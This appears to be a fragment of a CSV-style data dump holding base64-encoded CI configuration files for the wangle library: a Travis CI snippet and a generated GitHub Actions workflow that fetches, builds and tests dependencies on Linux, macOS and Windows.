a2FnZXM6IHB5dGhvbjIuNwoKc2NyaXB0OgogICMgV2UgZG9uJ3Qgd2FudCB0
byB3cml0ZSB0aGUgc2NyaXB0IGlubGluZSBiZWNhdXNlIG9mIFRyYXZpcyBr
bHVkZ2luZXNzIC0tCiAgIyBpdCBsb29rcyBsaWtlIGl0IGVzY2FwZXMgIiBh
bmQgXCBpbiBzY3JpcHRzIHdoZW4gdXNpbmcgYG1hdHJpeDpgLgogIC0gLi9i
dWlsZC9mYmNvZGVfYnVpbGRlci90cmF2aXNfZG9ja2VyX2J1aWxkLnNoCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"IyBUaGlzIGZpbGUgd2FzIEBnZW5lcmF0ZWQgYnkgZ2V0ZGVwcy5weQoKbmFt
ZTogQ0kKCm9uOgogIHB1c2g6CiAgICBicmFuY2hlczoKICAgIC0gbWFzdGVy
CiAgcHVsbF9yZXF1ZXN0OgogICAgYnJhbmNoZXM6CiAgICAtIG1hc3RlcgoK
am9iczoKICBsaW51eDoKICAgIHJ1bnMtb246IHVidW50dS0xOC4wNAogICAg
c3RlcHM6CiAgICAtIHVzZXM6IGFjdGlvbnMvY2hlY2tvdXRAdjEKICAgIC0g
bmFtZTogRmV0Y2ggYm9vc3QKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJj
b2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBmZXRjaCAtLW5vLXRlc3RzIGJvb3N0
CiAgICAtIG5hbWU6IEZldGNoIG5pbmphCiAgICAgIHJ1bjogcHl0aG9uIGJ1
aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgZmV0Y2ggLS1uby10ZXN0
cyBuaW5qYQogICAgLSBuYW1lOiBGZXRjaCBjbWFrZQogICAgICBydW46IHB5
dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZldGNoIC0t
bm8tdGVzdHMgY21ha2UKICAgIC0gbmFtZTogRmV0Y2ggZ29vZ2xldGVzdAog
ICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBz
LnB5IGZldGNoIC0tbm8tdGVzdHMgZ29vZ2xldGVzdAogICAgLSBuYW1lOiBG
ZXRjaCBkb3VibGUtY29udmVyc2lvbgogICAgICBydW46IHB5dGhvbiBidWls
ZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZldGNoIC0tbm8tdGVzdHMg
ZG91YmxlLWNvbnZlcnNpb24KICAgIC0gbmFtZTogRmV0Y2ggZm10CiAgICAg
IHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkg
ZmV0Y2ggLS1uby10ZXN0cyBmbXQKICAgIC0gbmFtZTogRmV0Y2ggZ2ZsYWdz
CiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRl
cHMucHkgZmV0Y2ggLS1uby10ZXN0cyBnZmxhZ3MKICAgIC0gbmFtZTogRmV0
Y2ggZ2xvZwogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRl
ci9nZXRkZXBzLnB5IGZldGNoIC0tbm8tdGVzdHMgZ2xvZwogICAgLSBuYW1l
OiBGZXRjaCBsaWJldmVudAogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNv
ZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZldGNoIC0tbm8tdGVzdHMgbGliZXZl
bnQKICAgIC0gbmFtZTogRmV0Y2ggc25hcHB5CiAgICAgIHJ1bjogcHl0aG9u
IGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgZmV0Y2ggLS1uby10
ZXN0cyBzbmFwcHkKICAgIC0gbmFtZTogRmV0Y2ggenN0ZAogICAgICBydW46
IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZldGNo
IC0tbm8tdGVzdHMgenN0ZAogICAgLSBuYW1lOiBGZXRjaCBmb2xseQogICAg
ICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5
IGZldGNoIC0tbm8tdGVzdHMgZm9sbHkKICAgIC0gbmFtZTogRmV0Y2ggYXV0
b2NvbmYKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIv
Z2V0ZGVwcy5weSBmZXRjaCAtLW5vLXRlc3RzIGF1dG9jb25mCiAgICAtIG5h
bWU6IEZldGNoIGF1dG9tYWtlCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2Zi
Y29kZV9idWlsZGVyL2dldGRlcHMucHkgZmV0Y2ggLS1uby10ZXN0cyBhdXRv
bWFrZQogICAgLSBuYW1lOiBGZXRjaCBsaWJ0b29sCiAgICAgIHJ1bjogcHl0
aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgZmV0Y2ggLS1u
by10ZXN0cyBsaWJ0b29sCiAgICAtIG5hbWU6IEZldGNoIGxpYnNvZGl1bQog
ICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBz
LnB5IGZldGNoIC0tbm8tdGVzdHMgbGlic29kaXVtCiAgICAtIG5hbWU6IEZl
dGNoIGZpenoKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxk
ZXIvZ2V0ZGVwcy5weSBmZXRjaCAtLW5vLXRlc3RzIGZpenoKICAgIC0gbmFt
ZTogQnVpbGQgYm9vc3QKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2Rl
X2J1aWxkZXIvZ2V0ZGVwcy5weSBidWlsZCAtLW5vLXRlc3RzIGJvb3N0CiAg
ICAtIG5hbWU6IEJ1aWxkIG5pbmphCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxk
L2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0cyBu
aW5qYQogICAgLSBuYW1lOiBCdWlsZCBjbWFrZQogICAgICBydW46IHB5dGhv
biBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGJ1aWxkIC0tbm8t
dGVzdHMgY21ha2UKICAgIC0gbmFtZTogQnVpbGQgZ29vZ2xldGVzdAogICAg
ICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5
IGJ1aWxkIC0tbm8tdGVzdHMgZ29vZ2xldGVzdAogICAgLSBuYW1lOiBCdWls
ZCBkb3VibGUtY29udmVyc2lvbgogICAgICBydW46IHB5dGhvbiBidWlsZC9m
YmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGJ1aWxkIC0tbm8tdGVzdHMgZG91
YmxlLWNvbnZlcnNpb24KICAgIC0gbmFtZTogQnVpbGQgZm10CiAgICAgIHJ1
bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgYnVp
bGQgLS1uby10ZXN0cyBmbXQKICAgIC0gbmFtZTogQnVpbGQgZ2ZsYWdzCiAg
ICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMu
cHkgYnVpbGQgLS1uby10ZXN0cyBnZmxhZ3MKICAgIC0gbmFtZTogQnVpbGQg
Z2xvZwogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9n
ZXRkZXBzLnB5IGJ1aWxkIC0tbm8tdGVzdHMgZ2xvZwogICAgLSBuYW1lOiBC
dWlsZCBsaWJldmVudAogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVf
YnVpbGRlci9nZXRkZXBzLnB5IGJ1aWxkIC0tbm8tdGVzdHMgbGliZXZlbnQK
ICAgIC0gbmFtZTogQnVpbGQgc25hcHB5CiAgICAgIHJ1bjogcHl0aG9uIGJ1
aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0
cyBzbmFwcHkKICAgIC0gbmFtZTogQnVpbGQgenN0ZAogICAgICBydW46IHB5
dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGJ1aWxkIC0t
bm8tdGVzdHMgenN0ZAogICAgLSBuYW1lOiBCdWlsZCBmb2xseQogICAgICBy
dW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGJ1
aWxkIC0tbm8tdGVzdHMgZm9sbHkKICAgIC0gbmFtZTogQnVpbGQgYXV0b2Nv
bmYKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0
ZGVwcy5weSBidWlsZCAtLW5vLXRlc3RzIGF1dG9jb25mCiAgICAtIG5hbWU6
IEJ1aWxkIGF1dG9tYWtlCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29k
ZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0cyBhdXRvbWFr
ZQogICAgLSBuYW1lOiBCdWlsZCBsaWJ0b29sCiAgICAgIHJ1bjogcHl0aG9u
IGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10
ZXN0cyBsaWJ0b29sCiAgICAtIG5hbWU6IEJ1aWxkIGxpYnNvZGl1bQogICAg
ICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5
IGJ1aWxkIC0tbm8tdGVzdHMgbGlic29kaXVtCiAgICAtIG5hbWU6IEJ1aWxk
IGZpenoKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIv
Z2V0ZGVwcy5weSBidWlsZCAtLW5vLXRlc3RzIGZpenoKICAgIC0gbmFtZTog
QnVpbGQgd2FuZ2xlCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9i
dWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1zcmMtZGlyPS4gd2FuZ2xlCiAg
ICAtIG5hbWU6IFRlc3Qgd2FuZ2xlCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxk
L2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgdGVzdCAtLXNyYy1kaXI9LiB3
YW5nbGUKICBtYWM6CiAgICBydW5zLW9uOiBtYWNPUy1sYXRlc3QKICAgIHN0
ZXBzOgogICAgLSB1c2VzOiBhY3Rpb25zL2NoZWNrb3V0QHYxCiAgICAtIG5h
bWU6IEZldGNoIGJvb3N0CiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29k
ZV9idWlsZGVyL2dldGRlcHMucHkgZmV0Y2ggLS1uby10ZXN0cyBib29zdAog
ICAgLSBuYW1lOiBGZXRjaCBvcGVuc3NsCiAgICAgIHJ1bjogcHl0aG9uIGJ1
aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgZmV0Y2ggLS1uby10ZXN0
cyBvcGVuc3NsCiAgICAtIG5hbWU6IEZldGNoIG5pbmphCiAgICAgIHJ1bjog
cHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgZmV0Y2gg
LS1uby10ZXN0cyBuaW5qYQogICAgLSBuYW1lOiBGZXRjaCBjbWFrZQogICAg
ICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5
IGZldGNoIC0tbm8tdGVzdHMgY21ha2UKICAgIC0gbmFtZTogRmV0Y2ggZ29v
Z2xldGVzdAogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRl
ci9nZXRkZXBzLnB5IGZldGNoIC0tbm8tdGVzdHMgZ29vZ2xldGVzdAogICAg
LSBuYW1lOiBGZXRjaCBkb3VibGUtY29udmVyc2lvbgogICAgICBydW46IHB5
dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZldGNoIC0t
bm8tdGVzdHMgZG91YmxlLWNvbnZlcnNpb24KICAgIC0gbmFtZTogRmV0Y2gg
Zm10CiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dl
dGRlcHMucHkgZmV0Y2ggLS1uby10ZXN0cyBmbXQKICAgIC0gbmFtZTogRmV0
Y2ggZ2ZsYWdzCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWls
ZGVyL2dldGRlcHMucHkgZmV0Y2ggLS1uby10ZXN0cyBnZmxhZ3MKICAgIC0g
bmFtZTogRmV0Y2ggZ2xvZwogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNv
ZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZldGNoIC0tbm8tdGVzdHMgZ2xvZwog
ICAgLSBuYW1lOiBGZXRjaCBsaWJldmVudAogICAgICBydW46IHB5dGhvbiBi
dWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZldGNoIC0tbm8tdGVz
dHMgbGliZXZlbnQKICAgIC0gbmFtZTogRmV0Y2ggc25hcHB5CiAgICAgIHJ1
bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgZmV0
Y2ggLS1uby10ZXN0cyBzbmFwcHkKICAgIC0gbmFtZTogRmV0Y2ggenN0ZAog
ICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBz
LnB5IGZldGNoIC0tbm8tdGVzdHMgenN0ZAogICAgLSBuYW1lOiBGZXRjaCBm
b2xseQogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9n
ZXRkZXBzLnB5IGZldGNoIC0tbm8tdGVzdHMgZm9sbHkKICAgIC0gbmFtZTog
RmV0Y2ggYXV0b2NvbmYKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2Rl
X2J1aWxkZXIvZ2V0ZGVwcy5weSBmZXRjaCAtLW5vLXRlc3RzIGF1dG9jb25m
CiAgICAtIG5hbWU6IEZldGNoIGF1dG9tYWtlCiAgICAgIHJ1bjogcHl0aG9u
IGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgZmV0Y2ggLS1uby10
ZXN0cyBhdXRvbWFrZQogICAgLSBuYW1lOiBGZXRjaCBsaWJ0b29sCiAgICAg
IHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkg
ZmV0Y2ggLS1uby10ZXN0cyBsaWJ0b29sCiAgICAtIG5hbWU6IEZldGNoIGxp
YnNvZGl1bQogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRl
ci9nZXRkZXBzLnB5IGZldGNoIC0tbm8tdGVzdHMgbGlic29kaXVtCiAgICAt
IG5hbWU6IEZldGNoIGZpenoKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJj
b2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBmZXRjaCAtLW5vLXRlc3RzIGZpenoK
ICAgIC0gbmFtZTogQnVpbGQgYm9vc3QKICAgICAgcnVuOiBweXRob24gYnVp
bGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBidWlsZCAtLW5vLXRlc3Rz
IGJvb3N0CiAgICAtIG5hbWU6IEJ1aWxkIG9wZW5zc2wKICAgICAgcnVuOiBw
eXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBidWlsZCAt
LW5vLXRlc3RzIG9wZW5zc2wKICAgIC0gbmFtZTogQnVpbGQgbmluamEKICAg
ICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5w
eSBidWlsZCAtLW5vLXRlc3RzIG5pbmphCiAgICAtIG5hbWU6IEJ1aWxkIGNt
YWtlCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dl
dGRlcHMucHkgYnVpbGQgLS1uby10ZXN0cyBjbWFrZQogICAgLSBuYW1lOiBC
dWlsZCBnb29nbGV0ZXN0CiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29k
ZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0cyBnb29nbGV0
ZXN0CiAgICAtIG5hbWU6IEJ1aWxkIGRvdWJsZS1jb252ZXJzaW9uCiAgICAg
IHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkg
YnVpbGQgLS1uby10ZXN0cyBkb3VibGUtY29udmVyc2lvbgogICAgLSBuYW1l
OiBCdWlsZCBmbXQKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1
aWxkZXIvZ2V0ZGVwcy5weSBidWlsZCAtLW5vLXRlc3RzIGZtdAogICAgLSBu
YW1lOiBCdWlsZCBnZmxhZ3MKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJj
b2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBidWlsZCAtLW5vLXRlc3RzIGdmbGFn
cwogICAgLSBuYW1lOiBCdWlsZCBnbG9nCiAgICAgIHJ1bjogcHl0aG9uIGJ1
aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0
cyBnbG9nCiAgICAtIG5hbWU6IEJ1aWxkIGxpYmV2ZW50CiAgICAgIHJ1bjog
cHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQg
LS1uby10ZXN0cyBsaWJldmVudAogICAgLSBuYW1lOiBCdWlsZCBzbmFwcHkK
ICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVw
cy5weSBidWlsZCAtLW5vLXRlc3RzIHNuYXBweQogICAgLSBuYW1lOiBCdWls
ZCB6c3RkCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVy
L2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0cyB6c3RkCiAgICAtIG5hbWU6
IEJ1aWxkIGZvbGx5CiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9i
dWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0cyBmb2xseQogICAg
LSBuYW1lOiBCdWlsZCBhdXRvY29uZgogICAgICBydW46IHB5dGhvbiBidWls
ZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGJ1aWxkIC0tbm8tdGVzdHMg
YXV0b2NvbmYKICAgIC0gbmFtZTogQnVpbGQgYXV0b21ha2UKICAgICAgcnVu
OiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBidWls
ZCAtLW5vLXRlc3RzIGF1dG9tYWtlCiAgICAtIG5hbWU6IEJ1aWxkIGxpYnRv
b2wKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0
ZGVwcy5weSBidWlsZCAtLW5vLXRlc3RzIGxpYnRvb2wKICAgIC0gbmFtZTog
QnVpbGQgbGlic29kaXVtCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29k
ZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0cyBsaWJzb2Rp
dW0KICAgIC0gbmFtZTogQnVpbGQgZml6egogICAgICBydW46IHB5dGhvbiBi
dWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGJ1aWxkIC0tbm8tdGVz
dHMgZml6egogICAgLSBuYW1lOiBCdWlsZCB3YW5nbGUKICAgICAgcnVuOiBw
eXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBidWlsZCAt
LXNyYy1kaXI9LiB3YW5nbGUKICAgIC0gbmFtZTogVGVzdCB3YW5nbGUKICAg
ICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5w
eSB0ZXN0IC0tc3JjLWRpcj0uIHdhbmdsZQogIHdpbmRvd3M6CiAgICBydW5z
LW9uOiB3aW5kb3dzLTIwMTYKICAgIHN0ZXBzOgogICAgLSB1c2VzOiBhY3Rp
b25zL2NoZWNrb3V0QHYxCiAgICAtIG5hbWU6IEZldGNoIGxpYnNvZGl1bQog
ICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBz
LnB5IGZldGNoIC0tbm8tdGVzdHMgbGlic29kaXVtCiAgICAtIG5hbWU6IEZl
dGNoIGJvb3N0CiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWls
ZGVyL2dldGRlcHMucHkgZmV0Y2ggLS1uby10ZXN0cyBib29zdAogICAgLSBu
YW1lOiBGZXRjaCBuaW5qYQogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNv
ZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZldGNoIC0tbm8tdGVzdHMgbmluamEK
ICAgIC0gbmFtZTogRmV0Y2ggY21ha2UKICAgICAgcnVuOiBweXRob24gYnVp
bGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBmZXRjaCAtLW5vLXRlc3Rz
IGNtYWtlCiAgICAtIG5hbWU6IEZldGNoIGdvb2dsZXRlc3QKICAgICAgcnVu
OiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBmZXRj
aCAtLW5vLXRlc3RzIGdvb2dsZXRlc3QKICAgIC0gbmFtZTogRmV0Y2ggZG91
YmxlLWNvbnZlcnNpb24KICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2Rl
X2J1aWxkZXIvZ2V0ZGVwcy5weSBmZXRjaCAtLW5vLXRlc3RzIGRvdWJsZS1j
b252ZXJzaW9uCiAgICAtIG5hbWU6IEZldGNoIGZtdAogICAgICBydW46IHB5
dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZldGNoIC0t
bm8tdGVzdHMgZm10CiAgICAtIG5hbWU6IEZldGNoIGdmbGFncwogICAgICBy
dW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZl
dGNoIC0tbm8tdGVzdHMgZ2ZsYWdzCiAgICAtIG5hbWU6IEZldGNoIGdsb2cK
ICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVw
cy5weSBmZXRjaCAtLW5vLXRlc3RzIGdsb2cKICAgIC0gbmFtZTogRmV0Y2gg
c25hcHB5CiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVy
L2dldGRlcHMucHkgZmV0Y2ggLS1uby10ZXN0cyBzbmFwcHkKICAgIC0gbmFt
ZTogRmV0Y2ggemxpYgogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVf
YnVpbGRlci9nZXRkZXBzLnB5IGZldGNoIC0tbm8tdGVzdHMgemxpYgogICAg
LSBuYW1lOiBGZXRjaCB6c3RkCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2Zi
Y29kZV9idWlsZGVyL2dldGRlcHMucHkgZmV0Y2ggLS1uby10ZXN0cyB6c3Rk
CiAgICAtIG5hbWU6IEZldGNoIHBlcmwKICAgICAgcnVuOiBweXRob24gYnVp
bGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBmZXRjaCAtLW5vLXRlc3Rz
IHBlcmwKICAgIC0gbmFtZTogRmV0Y2ggb3BlbnNzbAogICAgICBydW46IHB5
dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGZldGNoIC0t
bm8tdGVzdHMgb3BlbnNzbAogICAgLSBuYW1lOiBGZXRjaCBsaWJldmVudAog
ICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBz
LnB5IGZldGNoIC0tbm8tdGVzdHMgbGliZXZlbnQKICAgIC0gbmFtZTogRmV0
Y2ggZm9sbHkKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxk
ZXIvZ2V0ZGVwcy5weSBmZXRjaCAtLW5vLXRlc3RzIGZvbGx5CiAgICAtIG5h
bWU6IEZldGNoIGZpenoKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2Rl
X2J1aWxkZXIvZ2V0ZGVwcy5weSBmZXRjaCAtLW5vLXRlc3RzIGZpenoKICAg
IC0gbmFtZTogQnVpbGQgbGlic29kaXVtCiAgICAgIHJ1bjogcHl0aG9uIGJ1
aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0
cyBsaWJzb2RpdW0KICAgIC0gbmFtZTogQnVpbGQgYm9vc3QKICAgICAgcnVu
OiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBidWls
ZCAtLW5vLXRlc3RzIGJvb3N0CiAgICAtIG5hbWU6IEJ1aWxkIG5pbmphCiAg
ICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMu
cHkgYnVpbGQgLS1uby10ZXN0cyBuaW5qYQogICAgLSBuYW1lOiBCdWlsZCBj
bWFrZQogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9n
ZXRkZXBzLnB5IGJ1aWxkIC0tbm8tdGVzdHMgY21ha2UKICAgIC0gbmFtZTog
QnVpbGQgZ29vZ2xldGVzdAogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNv
ZGVfYnVpbGRlci9nZXRkZXBzLnB5IGJ1aWxkIC0tbm8tdGVzdHMgZ29vZ2xl
dGVzdAogICAgLSBuYW1lOiBCdWlsZCBkb3VibGUtY29udmVyc2lvbgogICAg
ICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5
IGJ1aWxkIC0tbm8tdGVzdHMgZG91YmxlLWNvbnZlcnNpb24KICAgIC0gbmFt
ZTogQnVpbGQgZm10CiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9i
dWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0cyBmbXQKICAgIC0g
bmFtZTogQnVpbGQgZ2ZsYWdzCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2Zi
Y29kZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0cyBnZmxh
Z3MKICAgIC0gbmFtZTogQnVpbGQgZ2xvZwogICAgICBydW46IHB5dGhvbiBi
dWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGJ1aWxkIC0tbm8tdGVz
dHMgZ2xvZwogICAgLSBuYW1lOiBCdWlsZCBzbmFwcHkKICAgICAgcnVuOiBw
eXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVwcy5weSBidWlsZCAt
LW5vLXRlc3RzIHNuYXBweQogICAgLSBuYW1lOiBCdWlsZCB6bGliCiAgICAg
IHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkg
YnVpbGQgLS1uby10ZXN0cyB6bGliCiAgICAtIG5hbWU6IEJ1aWxkIHpzdGQK
ICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0ZGVw
cy5weSBidWlsZCAtLW5vLXRlc3RzIHpzdGQKICAgIC0gbmFtZTogQnVpbGQg
cGVybAogICAgICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9n
ZXRkZXBzLnB5IGJ1aWxkIC0tbm8tdGVzdHMgcGVybAogICAgLSBuYW1lOiBC
dWlsZCBvcGVuc3NsCiAgICAgIHJ1bjogcHl0aG9uIGJ1aWxkL2ZiY29kZV9i
dWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0cyBvcGVuc3NsCiAg
ICAtIG5hbWU6IEJ1aWxkIGxpYmV2ZW50CiAgICAgIHJ1bjogcHl0aG9uIGJ1
aWxkL2ZiY29kZV9idWlsZGVyL2dldGRlcHMucHkgYnVpbGQgLS1uby10ZXN0
cyBsaWJldmVudAogICAgLSBuYW1lOiBCdWlsZCBmb2xseQogICAgICBydW46
IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5IGJ1aWxk
IC0tbm8tdGVzdHMgZm9sbHkKICAgIC0gbmFtZTogQnVpbGQgZml6egogICAg
ICBydW46IHB5dGhvbiBidWlsZC9mYmNvZGVfYnVpbGRlci9nZXRkZXBzLnB5
IGJ1aWxkIC0tbm8tdGVzdHMgZml6egogICAgLSBuYW1lOiBCdWlsZCB3YW5n
bGUKICAgICAgcnVuOiBweXRob24gYnVpbGQvZmJjb2RlX2J1aWxkZXIvZ2V0
ZGVwcy5weSBidWlsZCAtLXNyYy1kaXI9LiB3YW5nbGUKICAgIC0gbmFtZTog
